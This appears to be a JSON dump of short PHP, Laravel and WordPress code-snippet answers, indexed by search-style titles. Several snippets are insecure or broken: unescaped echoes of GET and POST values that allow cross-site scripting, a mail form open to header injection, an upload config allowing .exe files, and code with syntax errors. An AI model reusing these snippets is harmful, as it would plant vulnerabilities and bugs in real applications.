$order_shipping_state = $order_data['shipping']['state']; $order_shipping_postcode = $order_data['shipping']['postcode']; $order_shipping_country = $order_data['shipping']['country'];\n// Get an instance of the WC_Order object (same as before) $order = wc_get_order( $order_id );  $order_id  = $order->get_id(); // Get the order ID $parent_id = $order->get_parent_id(); // Get the parent order ID (for subscriptions&hellip;)  $user_id   = $order->get_user_id(); // Get the costumer ID $user      = $order->get_user(); // Get the WP_User object  $order_status  = $order->get_status(); // Get the order status  $currency      = $order->get_currency(); // Get the currency used   $payment_method = $order->get_payment_method(); // Get the payment method ID $payment_title = $order->get_payment_method_title(); // Get the payment method title $date_created  = $order->get_date_created(); // Get date created (WC_DateTime object) $date_modified = $order->get_date_modified(); // Get date modified (WC_DateTime object)  $billing_country = $order->get_billing_country(); // Customer billing country  // ... and so on ...\nforeach ( $items as $item ) {     $product_name = $item->get_name();     $product_id = $item->get_product_id();     $product_variation_id = $item->get_variation_id(); }\n",
    "reg_date": "2021-10-12T10:14:18.000Z"
  },
  {
    "id": 1341,
    "keyword": null,
    "link": null,
    "title": " get original name without mutant model laravel",
    "description": "Inside your model file:  1. In laravel older versions (5.x and older): // that skips mutators $this->getOriginal('name');  2. In laravel latest versions (6.x and above): // that skips mutators $model->getRawOriginal('name');  Alternative methods for getting value with mutator: 1. $this->attributes['name'] 2. $this->getAttributes()['name']`\n",
    "reg_date": "2021-10-12T10:14:18.000Z"
  },
  {
    "id": 1342,
    "keyword": null,
    "link": null,
    "title": " get page name wp",
    "description": "$slug = basename(get_permalink()); //or $wp_query->queried_object->post_name\n",
    "reg_date": "2021-10-12T10:14:18.000Z"
  },
  {
    "id": 1343,
    "keyword": null,
    "link": null,
    "title": " get parameter in php",
    "description": "#Get Method and Post Data  Send data through get and Post  $_GET Example ============ <?php if(isset($_GET['name'])){ echo htmlentities($_GET['name']); //or //$name = htmlentities($_GET['name']); //echo $name print_r($_GET); } ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"GET action=get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_POST Example ================ <?php if(isset($_GET['name'])){ //echo htmlentities($_GET['name']); //or //$name = htmlentities($_GET['name']); //echo $name //print_r($_GET); }  if(isset($_POST['name'])){     $name = htmlentities($_POST['name']);     echo $name;     print_r($_POST); } ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_REQUEST Example  //another uncommon way to do it. This is not    //normally done this way ================ <?php if(isset($_REQUEST['name'])){     $name = htmlentities($_REQUEST['name']);     echo $name;     print_r($_REQUEST); }  ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_SERVER['QUERY_STRING']  Example ================ <?php echo $_SERVER['QUERY_STRING'];   ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html>\n<?php    // if your url is http://link?var=value    if (isset($_GET['var'])) // works with request \t$var = $_GET['var']; echo $var;  // output value \n<form action=\"/\" method=\"get\">   <input type=\"text\" name=\"name\">   <br>   <input type=\"submit\"> </form> <?php   echo $_GET[\"query\"]; ?>\n",
    "reg_date": "2021-10-12T10:14:18.000Z"
  },
  {
    "id": 1344,
    "keyword": null,
    "link": null,
    "title": " get parameter php",
    "description": "<?php    // if your url is http://link?var=value    if (isset($_GET['var'])) // works with request \t$var = $_GET['var']; echo $var;  // output value \n<a href=\"index.php?id=<?php echo $my_id;?>&name=<?php echo $my_name;?>Click</a>  <?php $id = intval($_GET['id']);\t\t// integer value $name = strval($_GET['name']);\t// string value ?>\n",
    "reg_date": "2021-10-12T10:14:18.000Z"
  },
  {
    "id": 1345,
    "keyword": null,
    "link": null,
    "title": " get parent page link wordpress",
    "description": "<?php global $post;   if ( $post->post_parent ) { ?>     <a href=\"<?php echo get_permalink( $post->post_parent ); ?>\" >     <?php echo get_the_title( $post->post_parent ); ?>     </a> <?php } ?>\n",
    "reg_date": "2021-10-12T10:14:18.000Z"
  },
  {
    "id": 1346,
    "keyword": null,
    "link": null,
    "title": " get php memory limit command line",
    "description": "php -d memory_limit=-1\nphp -i | grep \"memory_limit\"\n",
    "reg_date": "2021-10-12T10:14:18.000Z"
  },
  {
    "id": 1347,
    "keyword": null,
    "link": null,
    "title": " get php to send email from form",
    "description": "<?php  if(isset($_POST['submit'])){     $to = \"email@example.com\"; // this is your Email address     $from = $_POST['email']; // this is the sender's Email address     $first_name = $_POST['first_name'];     $last_name = $_POST['last_name'];     $subject = \"Form submission\";     $subject2 = \"Copy of your form submission\";     $message = $first_name . \" \" . $last_name . \" wrote the following:\" . \"\\n\\n\" . $_POST['message'];     $message2 = \"Here is a copy of your message \" . $first_name . \"\\n\\n\" . $_POST['message'];      $headers = \"From:\" . $from;     $headers2 = \"From:\" . $to;     mail($to,$subject,$message,$headers);     mail($from,$subject2,$message2,$headers2); // sends a copy of the message to the sender     echo \"Mail Sent. Thank you \" . $first_name . \", we will contact you shortly.\";     // You can also use header('Location: thank_you.php'); to redirect to another page.     } ?>  <!DOCTYPE html> <head> <title>Form submission</title> </head> <body>  <form action=\"\" method=\"post\"> First Name: <input type=\"text\" name=\"first_name\"><br> Last Name: <input type=\"text\" name=\"last_name\"><br> Email: <input type=\"text\" name=\"email\"><br> Message:<br><textarea rows=\"5\" name=\"message\" cols=\"30\"></textarea><br> <input type=\"submit\" name=\"submit\" value=\"Submit\"> </form>  </body> </html> \n",
    "reg_date": "2021-10-12T10:14:18.000Z"
  },
  {
    "id": 1348,
    "keyword": null,
    "link": null,
    "title": " get post data in php javascript",
    "description": "if($json = json_decode(file_get_contents(\"php://input\"), true)) {     $data = $json; } else {     $data = $_POST; }\n",
    "reg_date": "2021-10-12T10:14:18.000Z"
  },
  {
    "id": 1349,
    "keyword": null,
    "link": null,
    "title": " get post in php",
    "description": "<form method=\"post\" action=\"<?php echo $_SERVER['PHP_SELF'];?>\">   Name: <input type=\"text\" name=\"fname\">   <input type=\"submit\"> </form> <?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {   // do logic   $name = $_POST['fname']; } ?>\n$response = httpPost(\"http://mywebsite.com/update.php\", \tarray(\"first_name\"=>\"Bob\",\"last_name\"=>\"Dillon\") );  //using php curl (sudo apt-get install php-curl)  function httpPost($url, $data){     $curl = curl_init($url);     curl_setopt($curl, CURLOPT_POST, true);     curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     $response = curl_exec($curl);     curl_close($curl);     return $response; }\n<?php var = $_POST['var']; echo var;    // YOUR METHOD IN HTML MUST BE IN POST  <form method=\"post\"> \t<input type=\"text\" name=\"var\">   </form>\n$data = json_decode(file_get_contents('php://input'), true);  // you have all in an array\n<form action=\"/\" method=\"get\">   <input type=\"text\" name=\"name\">   <br>   <input type=\"submit\"> </form> <?php   echo $_GET[\"query\"]; ?>\n",
    "reg_date": "2021-10-12T10:14:18.000Z"
  },
  {
    "id": 1350,
    "keyword": null,
    "link": null,
    "title": " get post index wordpress",
    "description": "<?php $i = 0; while ( have_posts() ) : the_post(); ?>   <?php \t//do something   $i++;   ?> <?php endwhile; ?>\n",
    "reg_date": "2021-10-12T10:14:19.000Z"
  },
  {
    "id": 1351,
    "keyword": null,
    "link": null,
    "title": " get post info in php",
    "description": "$data = json_decode(file_get_contents('php://input'), true);  // you have all in an array\n",
    "reg_date": "2021-10-12T10:14:19.000Z"
  },
  {
    "id": 1352,
    "keyword": null,
    "link": null,
    "title": " get post order by meta value int",
    "description": "$defaults = array(   \t'numberposts'      => -1, \t'post_type'        => 'agent_listing',   \t'meta_key'\t       => 'oepl_order_no',   \t'orderby'          => 'meta_value_num',   \t'order'            => 'ASC',   \t'suppress_filters' => false );  'orderby' => 'meta_value_num', // for int field 'orderby' => 'meta_value', // text field\n",
    "reg_date": "2021-10-12T10:14:19.000Z"
  },
  {
    "id": 1353,
    "keyword": null,
    "link": null,
    "title": " get post php",
    "description": "<?php var = $_POST['var']; echo var;    // YOUR METHOD IN HTML MUST BE IN POST  <form method=\"post\"> \t<input type=\"text\" name=\"var\">   </form>\n",
    "reg_date": "2021-10-12T10:14:19.000Z"
  },
  {
    "id": 1354,
    "keyword": null,
    "link": null,
    "title": " get post title by post id wordpress",
    "description": "get_post( $post_id )->post_title\nCode $args = array(\"post_type\" => \"mytype\", \"s\" => $title); $query = get_posts( $args );\n",
    "reg_date": "2021-10-12T10:14:19.000Z"
  },
  {
    "id": 1355,
    "keyword": null,
    "link": null,
    "title": " get posts category",
    "description": "$defaults_param = array( \t\t\t\t'numberposts'      \t=> -1, \t\t\t\t'post_type'        \t=> 'post', \t\t\t\t'category' \t\t\t=> 40 , \t\t\t\t'suppress_filters'\t=> false \t\t\t); $get_featured_post = get_posts($defaults_param);\n",
    "reg_date": "2021-10-12T10:14:19.000Z"
  },
  {
    "id": 1356,
    "keyword": null,
    "link": null,
    "title": " get previos moth from date function",
    "description": "$tgl = '25 january 2012';  $prevmonth = date(\"M Y\",mktime(0,0,0,date(\"m\", strtotime($tgl))-1,1,date(\"Y\", strtotime($tgl)))); echo $prevmonth;\n",
    "reg_date": "2021-10-12T10:14:19.000Z"
  },
  {
    "id": 1357,
    "keyword": null,
    "link": null,
    "title": " get price woocommerce product",
    "description": "$product = wc_get_product( $post_id );  $product->get_regular_price(); $product->get_sale_price(); $product->get_price(); \n$product = wc_get_product( $post_id );  $product->get_regular_price(); $product->get_sale_price(); $product->get_price();\nfunction so_30165014_price_shortcode_callback( $atts ) {     $atts = shortcode_atts( array(         'id' => null,     ), $atts, 'bartag' );      $html = '';      if( intval( $atts['id'] ) > 0 && function_exists( 'wc_get_product' ) ){          $_product = wc_get_product( $atts['id'] );          $html = \"price = \" . $_product->get_price();     }     return $html; } add_shortcode( 'woocommerce_price', 'so_30165014_price_shortcode_callback' );\n",
    "reg_date": "2021-10-12T10:14:19.000Z"
  },
  {
    "id": 1358,
    "keyword": null,
    "link": null,
    "title": " get random posts wordpress",
    "description": "$randomPosts = get_posts(array(    'orderby' => 'rand',    'posts_per_page' => 5,    'tag' => $tag, )); \n",
    "reg_date": "2021-10-12T10:14:19.000Z"
  },
  {
    "id": 1359,
    "keyword": null,
    "link": null,
    "title": " get records from Sunday to Sunday laravel",
    "description": "$now = Carbon::now(); $weekStartDate = $now->startOfWeek()->format('Y-m-d H:i'); $weekEndDate = $now->endOfWeek()->format('Y-m-d H:i');\n",
    "reg_date": "2021-10-12T10:14:20.000Z"
  },
  {
    "id": 1360,
    "keyword": null,
    "link": null,
    "title": " get refresh token google api",
    "description": "The Google Auth server issued Refresh tokens never expire &mdash; that's the whole point of the refresh tokens. The refresh token will expire (or I should say become unauthorized) when the user revokes access to your application.  Refer this doc it clearly states the function of refresh tokens.\n$token = '{\"access_token\":\"' . $token_data->access_token . '\",\"expires_in\":' . $token_data->expires_in . ',\"scope\":\"https:\\/\\/www.googleapis.com\\/auth\\/business.manage\",\"token_type\":\"' . $token_data->token_type . '\",\"created\":' . $token_data->created . '}'; $client = new \\Google_Client(); $client->setAccessType('offline'); $client->setAuthConfig(__DIR__ . '/../../../../public/assets/client_secrets.json'); $client->addScope(\\Google_Service_MyBusiness::BUSINESS); // Set the access token on the client. try {   if ( $client->isAccessTokenExpired() )   {    $this->refreshAccessToken($token_data, $client, 'gmb_user', $user_id, $brand->id);   }   else{     $client->setAccessToken($token);   } } catch (\\Exception $exception){  }  private function refreshAccessToken ($token_data, $client, $table, $user_id, $brand_id) {   Log::info('Token Expired 1:'.json_encode($token_data->refresh_token));   Log::info('Old Token:'.json_encode($token_data->access_token));   $access_token = $client->fetchAccessTokenWithRefreshToken($token_data->refresh_token);   Log::info('Renewed Token:'.json_encode($access_token));    $client->setAccessToken($access_token);    $result = DB::table($table)     ->where(['owner_id' => $user_id, 'brand_id' => $brand_id])     ->update(['access_token' => $client->getAccessToken()[\"access_token\"],               'expires_in' => $client->getAccessToken()[\"expires_in\"],               'token_type' => $client->getAccessToken()[\"token_type\"],               'created' => $client->getAccessToken()[\"created\"]              ]); }\n",
    "reg_date": "2021-10-12T10:14:20.000Z"
  },
  {
    "id": 1361,
    "keyword": null,
    "link": null,
    "title": " get request data in observer laravel",
    "description": "request() helper should work: if (request()->has('password')) {     $user->password = bcrypt(request()->password); }\n",
    "reg_date": "2021-10-12T10:14:20.000Z"
  },
  {
    "id": 1362,
    "keyword": null,
    "link": null,
    "title": " get request uri from request laravel 7",
    "description": "Try to use the following: \\Request::getRequestUri()\n$request->input('name'); $request->input('user.name'); // fetch from user object\n$request->fullUrl() \n",
    "reg_date": "2021-10-12T10:14:20.000Z"
  },
  {
    "id": 1363,
    "keyword": null,
    "link": null,
    "title": " get result count codeigniter",
    "description": "$this->db   ->where(['field'=>'foo'])   ->from(\"tablename\")   ->count_all_results();  //OR  $this->db   ->where(['field'=>'foo'])   ->count_all_results(\"tablename\");\npublic function record_count() {    return $this->db->count_all(\"tablename\"); }\n$this->db->select('id'); $this->db->from('table'); $this->db->where($your_conditions); $num_results = $this->db->count_all_results();\n",
    "reg_date": "2021-10-12T10:14:20.000Z"
  },
  {
    "id": 1364,
    "keyword": null,
    "link": null,
    "title": " get rss feed php",
    "description": "<?php $url = \"https://www.youtube.com/feeds/videos.xml?channel_id=UCbMi18KmKXRb79716KgnVOA\"; $xml = simplexml_load_file($url) or die(\"Error: Cannot create object\");  //echo \"number of entries: \" . count($xml->entry) . \"<br/>\"; $i = 0; while($i <= count($xml->entry)-1){     //<id>yt:video:7AQdAE_Yhck</id>     echo str_replace(\"yt:video:\", \"\", $xml->entry[$i]->id[0])  . \"<br/><br/>\";     //<title>Michigan Capitol Building Lansing Michigan</title>     echo str_replace(\"yt:video:\", \"\", $xml->entry[$i]->title[0])  . \"<br/><br/>\";     //<author>     //<name>Michigan Constitutional Crusader</name>     echo str_replace(\"yt:video:\", \"\", $xml->entry[$i]->author[0]->name[0])  . \"<br/><br/>\";     //$result = $xml->xpath('*//media:group/media:description');     //<yt:videoId>7AQdAE_Yhck</yt:videoId>     echo $xml->xpath('*//yt:videoId')[$i]  . \"<br/><br/>\";     //<media:starRating count=\"20\" average=\"4.60\" min=\"1\" max=\"5\"/>     echo $xml->xpath('*//media:starRating/@count')[$i] .\" \". $xml->xpath('*//media:starRating/@average')[$i]  . \"<br/><br/>\";     //<media:description></media:description>     echo $xml->xpath('*//media:description')[$i]  . \"<br/><br/>\";     $i++;    }  ?>\n<?php   function getFeed($feed_url) {           $content = file_get_contents($feed_url);     $x = new SimpleXmlElement($content);           echo \"<ul>\";           foreach($x->channel->item as $entry) {         echo \"<li><a href='$entry->link' title='$entry->title'>\" . $entry->title . \"</a></li>\";     }     echo \"</ul>\"; } ?> \n",
    "reg_date": "2021-10-12T10:14:20.000Z"
  },
  {
    "id": 1365,
    "keyword": null,
    "link": null,
    "title": " get session blade",
    "description": "{{ session()->get('name') }}\n@if(session()->has('qwick'))     @else      @endif\n",
    "reg_date": "2021-10-12T10:14:20.000Z"
  },
  {
    "id": 1366,
    "keyword": null,
    "link": null,
    "title": " get session id in laravel",
    "description": "Session::getId();\n//store multipal data Session::put('user', ['first_name' => $request->get('first_name'), 'user_role' => Auth::user()->user_role, 'city' => Auth::user()->city]);  //in blade template <p>   {{Session::get('user')['city']}} </p>  @foreach (Session::get('user') as $user) \t{{$user}} @endforeach  //condtion check @if(Session::has('user'))   @foreach (Session::get('user') as $user)   \t{{ $user }}   @endforeach @endif // condition check using ternary operator {{ (Session::has('user')) ? 45 : 55}}  //delete session Session::forget('customer'); //@sujay\n",
    "reg_date": "2021-10-12T10:14:20.000Z"
  },
  {
    "id": 1367,
    "keyword": null,
    "link": null,
    "title": " get single column value in laravel eloquent",
    "description": "Vehicle::find(3)->value('register_number');\n$items = DB::table('items')              ->select('id', 'ref_code', 'name', 'price')              ->where('ref_code','=', $request->ref_code)              ->first(); \n$collection = collect([     ['product_id' => 'prod-100', 'name' => 'Desk'],     ['product_id' => 'prod-200', 'name' => 'Chair'], ]);  $plucked = $collection->pluck('name');  $plucked->all();  // ['Desk', 'Chair']\nModelName::find(id)->value('column_name');\n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1368,
    "keyword": null,
    "link": null,
    "title": " get single row in codeigniter",
    "description": "$query = $this->db->get(); $ret = $query->row(); return $ret->campaign_id;\n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1369,
    "keyword": null,
    "link": null,
    "title": " get soft deleted data laravel",
    "description": "To also get soft deleted models :   $trashedAndNotTrashed = Model::withTrashed()->get();  Only soft deleted models in your results :   $onlySoftDeleted = Model::onlyTrashed()->get();\n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1370,
    "keyword": null,
    "link": null,
    "title": " get specific key value from array php",
    "description": "$cnt = count(array_filter($array,function($element) {   return $element['your_key']=='foo'; }));\n$ids = array_column($users, 'id'); \n$people = array(   2 => array(     'name' => 'John',     'fav_color' => 'green'   ),   5=> array(     'name' => 'Samuel',     'fav_color' => 'blue'   )); $found_key = array_search('blue', array_column($people, 'fav_color'));\n$array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1; \n    function cmp($a, $b)     {         return strcmp($a->display_name, $b->display_name);     }      usort($blogusers, \"cmp\");      foreach ($blogusers as $bloguser)     {         ...\n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1371,
    "keyword": null,
    "link": null,
    "title": " get start of month end of month  carbon",
    "description": "$now = Carbon::now(); $startOfMonth = $now->startOfMonth('Y-m-d'); $endOfMonth = $now->endOfMonth()->format('Y-m-d');\n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1372,
    "keyword": null,
    "link": null,
    "title": " get start of week end of week carbon",
    "description": "$now = Carbon::now(); $weekStartDate = $now->startOfWeek()->format('Y-m-d H:i'); $weekEndDate = $now->endOfWeek()->format('Y-m-d H:i');\n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1373,
    "keyword": null,
    "link": null,
    "title": " get stock product woocommerce by id",
    "description": "$product_id = 1100; $product = wc_get_product($product_id); echo $product->get_stock_quantity(); \n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1374,
    "keyword": null,
    "link": null,
    "title": " get substring after character php",
    "description": "$data = \"123_String\";     $whatIWant = substr($data, strpos($data, \"_\") + 1);     echo $whatIWant;\n<?php $my_url = 'http://www.example.com/5478631'; echo substr($my_url, strrpos($my_url, '/' )+1).\"\\n\"; ?>   // print: 5478631\n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1375,
    "keyword": null,
    "link": null,
    "title": " get table name from model laravel",
    "description": "protected $table = 'DomainRelatedSettings'; \n$item = new Item; $table = $item->getTable(); print_r($table);\n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1376,
    "keyword": null,
    "link": null,
    "title": " get taxonomies for custom post type",
    "description": "// get a list of available taxonomies for a post type $taxonomies = get_taxonomies(['object_type' => ['your_post_type']])\n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1377,
    "keyword": null,
    "link": null,
    "title": " get taxonomy name in singhle post",
    "description": "// RETRIVE TERM SLUG ( for single.php or template-part )  $terms = get_the_terms( $post->ID, 'your-taxonomy' ); if ( !empty( $terms ) ){     // get the first term     $term = array_shift( $terms );     echo $term->slug; }\n",
    "reg_date": "2021-10-12T10:14:21.000Z"
  },
  {
    "id": 1378,
    "keyword": null,
    "link": null,
    "title": " get template directory uri",
    "description": "/* get logo or image */ <img src=\"<?php echo get_template_directory_uri(); ?>/images/logo.png\" width=\"\" height=\"\" alt=\"\" /> \n",
    "reg_date": "2021-10-12T10:14:22.000Z"
  },
  {
    "id": 1379,
    "keyword": null,
    "link": null,
    "title": " get template name wordpress",
    "description": "get_page_template_slug()  if (get_page_template_slug() =='page-workflow.php' ) {   //stuff } \n<?php get_template_part( '/about', 'page' ); ?>\n",
    "reg_date": "2021-10-12T10:14:22.000Z"
  },
  {
    "id": 1380,
    "keyword": null,
    "link": null,
    "title": " get template part parameters",
    "description": "//NEW CLEAN way (WP 5.5.0 >=) of passing variables to template parts   $data = array('foo'=>'bar');  //add your variables as a third parameter get_template_part( 'template-parts/file', 'name', $data );  //In the template part itself: (IMPORTANT NOTE: the name of the variable has to be args) echo $args['foo'];\n",
    "reg_date": "2021-10-12T10:14:22.000Z"
  },
  {
    "id": 1381,
    "keyword": null,
    "link": null,
    "title": " get template part pass variable",
    "description": "//NEW CLEAN way (WP 5.5.0 >=) of passing variables to template parts   $data = array('foo'=>'bar');  //add your variables as a third parameter get_template_part( 'template-parts/file', 'name', $data );  //In the template part itself: (IMPORTANT NOTE: the name of the variable has to be args) echo $args['foo'];\n<?php get_header();  // etc.  // In the main template file $users = new \\WP_User_Query( [ ... ] );  foreach ( $users as $user ) {     set_query_var( 'user_id', absint( $user->ID ) );     get_template_part( 'template-parts/user', 'contact_methods' ); }\n",
    "reg_date": "2021-10-12T10:14:22.000Z"
  },
  {
    "id": 1382,
    "keyword": null,
    "link": null,
    "title": " get templete uri",
    "description": "<img src=\"<?php echo get_template_directory_uri(); ?>/images/logo.png\" width=\"\" height=\"\" alt=\"\" /> \n",
    "reg_date": "2021-10-12T10:14:22.000Z"
  },
  {
    "id": 1383,
    "keyword": null,
    "link": null,
    "title": " get term id",
    "description": "$term_name = get_term( $term_id )->name;\n<?php $current_term = get_queried_object()->term_id; ?>\nget_queried_object()->term_id;\n",
    "reg_date": "2021-10-12T10:14:22.000Z"
  },
  {
    "id": 1384,
    "keyword": null,
    "link": null,
    "title": " get term thumbnail",
    "description": "$image_id           = get_term_meta( $term->term_id, 'thumbnail_id', true ); $post_thumbnail_img = wp_get_attachment_image_src( $image_id, 'large' );  echo '<img src=\"' . $post_thumbnail_img[0] . '\" alt=\"' . $term->name . '\" />';\n",
    "reg_date": "2021-10-12T10:14:22.000Z"
  },
  {
    "id": 1385,
    "keyword": null,
    "link": null,
    "title": " get text field value in php",
    "description": "<form method=\"post\">   <input type=\"text\" name=\"deleteinput\" class=\"button\"/>   <input type=\"submit\" name=\"deletebtn\" class=\"button\" value=\"Delete single user data\"/> </form>   // php  <?php      $name = $_GET['deletebtn'];     echo $name; ?>\n",
    "reg_date": "2021-10-12T10:14:22.000Z"
  },
  {
    "id": 1386,
    "keyword": null,
    "link": null,
    "title": " get the current page id in wordpress",
    "description": "$page_id = get_queried_object_id();\nbody { background-color: red; }  .page-id-1 body, .page-id-2 body , .page-id-3 body {      background-color: green!important;  }\n",
    "reg_date": "2021-10-12T10:14:22.000Z"
  },
  {
    "id": 1387,
    "keyword": null,
    "link": null,
    "title": " get the id wordpress",
    "description": "function get_the_ID() { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.FunctionNameInvalid     $post = get_post();     return ! empty( $post ) ? $post->ID : false; } \n",
    "reg_date": "2021-10-12T10:14:23.000Z"
  },
  {
    "id": 1388,
    "keyword": null,
    "link": null,
    "title": " get the last saved row in a table laravel",
    "description": "$last = DB::table('items')->latest()->first();\n",
    "reg_date": "2021-10-12T10:14:23.000Z"
  },
  {
    "id": 1389,
    "keyword": null,
    "link": null,
    "title": " get the list of php versions installed",
    "description": "I use the following command to view installed PHP versions in Ubuntu: ======================================================================== sudo update-alternatives --list php   \n",
    "reg_date": "2021-10-12T10:14:23.000Z"
  },
  {
    "id": 1390,
    "keyword": null,
    "link": null,
    "title": " get the parameter from the route to the view",
    "description": "<a class=\"nav-link\" href=\" {{ route('profiles.show',$logged_user) }}\">\n",
    "reg_date": "2021-10-12T10:14:23.000Z"
  },
  {
    "id": 1391,
    "keyword": null,
    "link": null,
    "title": " get the string after a character in php",
    "description": "$data = \"123_String\";     $whatIWant = substr($data, strpos($data, \"_\") + 1);     echo $whatIWant;\n<?php $my_url = 'http://www.example.com/5478631'; echo substr($my_url, strrpos($my_url, '/' )+1).\"\\n\"; ?>   // print: 5478631\n",
    "reg_date": "2021-10-12T10:14:23.000Z"
  },
  {
    "id": 1392,
    "keyword": null,
    "link": null,
    "title": " get the value from date field in laravel livewire",
    "description": "    /// This solved my issue with dates and laravel livewire      <div wire.ignore.self>     <input wire.model=\"birthday_date\"  id=\"birthday_date\" class=\"form-controll date\" >    <script>             document.addEventListener('livewire:load', function () {                                      $('#birthday_date').on('dp.change', function (e) {                                          @this.set('birthday_date', e.target.value);                     });             });         </script>    </div>\n",
    "reg_date": "2021-10-12T10:14:23.000Z"
  },
  {
    "id": 1393,
    "keyword": null,
    "link": null,
    "title": " get theme path in wordpress",
    "description": "<img src=\"<?php echo get_template_directory_uri(); ?>/images/logo.png\" width=\"\" height=\"\" alt=\"\" /> \n// Get template directory example: <img src=\"<?php echo get_template_directory_uri(); ?>/images/logo.png\" />  // If you use child theme you will have to use another function: <img src=\"<?php echo get_stylesheet_directory_uri(); ?>/images/logo.png\" />   \ninclude( get_template_directory_uri() . '/includes/my_file.php' );\n",
    "reg_date": "2021-10-12T10:14:23.000Z"
  },
  {
    "id": 1394,
    "keyword": null,
    "link": null,
    "title": " get today date magento 2 object manager",
    "description": "$objectManager = \\Magento\\Framework\\App\\ObjectManager::getInstance(); $objDate = $objectManager->create('Magento\\Framework\\Stdlib\\DateTime\\DateTime'); $date = $objDate->gmtDate();\n",
    "reg_date": "2021-10-12T10:14:23.000Z"
  },
  {
    "id": 1395,
    "keyword": null,
    "link": null,
    "title": " get unique values in laravel",
    "description": "$users = User::select('name')->distinct()->get();\n",
    "reg_date": "2021-10-12T10:14:23.000Z"
  },
  {
    "id": 1396,
    "keyword": null,
    "link": null,
    "title": " get upload error codeigniter",
    "description": "if($this->input->post()) {    $file_element_name = 'image';  //this is the name of your input file. for example \"image\"    if ($_FILES['image']['name']!= \"\")    {       $config['upload_path'] = './uploads/';       $config['allowed_types'] = 'gif|jpg|png|exe|xls|doc|docx|xlsx|rar|zip';       $config['max_size']      = '8192';        $config['remove_spaces']=TRUE;  //it will remove all spaces       $config['encrypt_name']=TRUE;   //it wil encrypte the original file name       $this->load->library('upload', $config);        if (!$this->upload->do_upload($file_element_name))       {          $error = array('error' => $this->upload->display_errors());          $this->session->set_flashdata('error',$error['error']);          redirect('controller_name/function_name','refresh');       }       else       {          $data = $this->upload->data();          return $data['file_name'];                 }       $this->session->set_flashdata('msg','success message');       redirect('controller_name/function_name','refresh');    }    else    {         //if no file uploaded the do stuff here    }  }\n",
    "reg_date": "2021-10-12T10:14:24.000Z"
  },
  {
    "id": 1397,
    "keyword": null,
    "link": null,
    "title": " get url link in php",
    "description": "parse_url( $_SERVER[ 'REQUEST_URI' ], PHP_URL_PATH );\n<?php       if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')             $url = \"https://\";        else            $url = \"http://\";        // Append the host(domain name, ip) to the URL.        $url.= $_SERVER['HTTP_HOST'];             // Append the requested resource location to the URL        $url.= $_SERVER['REQUEST_URI'];                echo $url;     ?> \nactual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\";\n",
    "reg_date": "2021-10-12T10:14:24.000Z"
  },
  {
    "id": 1398,
    "keyword": null,
    "link": null,
    "title": " get url parameters in laravel blade",
    "description": "request('variable')\n/** resources/my_view.blade.php */  {{ request()->id }} \npublic function update($name) {     User::where('name', $name)->first();     return view('test')->with('user', $user); } \nurl('path') . '?' . http_build_query(['param1' => 'value', 'param2' => 'value']); \nRoute::put('user/{name}', 'UserController@show'); \nRoute::get('/posts/{post}/comments/{comment}', function ($postId, $commentId) {     return view('name of the view')->with('postId',$postId); });\n",
    "reg_date": "2021-10-12T10:14:24.000Z"
  },
  {
    "id": 1399,
    "keyword": null,
    "link": null,
    "title": " get url segment in php",
    "description": "$uri_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH); $uri_segments = explode('/', $uri_path);  echo $uri_segments[0]; // for www.example.com/user/account you will get 'user'\n",
    "reg_date": "2021-10-12T10:14:24.000Z"
  },
  {
    "id": 1400,
    "keyword": null,
    "link": null,
    "title": " get url with php",
    "description": "$fullURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];\n$full_url = 'http://'.$_SERVER[HTTP_HOST].$_SERVER[REQUEST_URI];\n$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\"; \n",
    "reg_date": "2021-10-12T10:14:24.000Z"
  },
  {
    "id": 1401,
    "keyword": null,
    "link": null,
    "title": " get user avatar wordpress",
